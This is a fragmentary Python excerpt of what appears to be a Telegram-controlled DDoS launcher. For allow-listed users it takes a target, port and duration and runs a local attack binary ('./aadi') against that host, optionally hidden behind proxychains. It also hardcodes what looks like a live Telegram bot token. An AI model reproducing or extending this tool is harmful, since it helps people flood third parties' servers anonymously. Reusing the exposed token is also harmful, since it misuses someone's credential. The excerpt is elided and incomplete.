...
bot = telebot.TeleBot('7431608957:AAFfs9VjvFNbg3IBrRA4m5vBuJVQI1sQbZI')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 700:
                ...
                if proxy:
                    full_command = f"proxychains4 -q ./aadi {target} {port} {time} 500"
                    os.environ['PROXYCHAINS_PROXY'] = proxy
                else:
                    full_command = f"./aadi {target} {port} {time} 500"
